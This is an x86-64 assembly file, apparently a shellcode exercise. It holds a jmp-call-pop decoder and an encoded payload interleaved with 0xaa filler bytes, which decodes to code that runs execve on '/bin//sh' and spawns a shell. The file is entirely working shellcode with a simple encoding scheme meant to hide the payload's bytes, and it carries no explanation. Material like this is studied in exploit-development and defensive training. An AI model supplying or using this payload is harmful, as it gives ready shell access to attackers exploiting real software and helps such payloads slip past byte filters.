
global _start

section .text

_start:
    jmp find_address

decoder:
    pop rdi
    mov r8, rdi; r8 points to shellcode and is inc by 1
    mov r9, rdi; r9 points to shellcode invalid bytes and is inc by 2
    inc r9
    xor r10, r10; r10 will store bytes being transferred

decode:
    mov r10b, byte [r9]
    xor r10b, 0xaa
    jnz end

    mov r10b, byte [r9+1]
    mov byte [r8+1], r10b

    inc r8
    inc r9
    inc r9

    jmp decode

end:
    jmp rdi


find_address:
    call decoder

    ; 31-execve-jcp.asm shellcode (len 60)
    shellcode: db 0x48,0xaa,0x31,0xaa,0xc0,0xaa,0x48,0xaa,0x83,0xaa,0xc0,0xaa,0x3b,0xaa,0x48,0xaa,0x31,0xaa,0xdb,0xaa,0x53,0xaa,0x48,0xaa,0xb9,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x51,0xaa,0x48,0xaa,0x31,0xaa,0xc9,0xaa,0x48,0xaa,0x89,0xaa,0xe7,0xaa,0x53,0xaa,0x48,0xaa,0x89,0xaa,0xe2,0xaa,0x57,0xaa,0x48,0xaa,0x89,0xaa,0xe6,0xaa,0xf,0xaa,0x5,0xbb



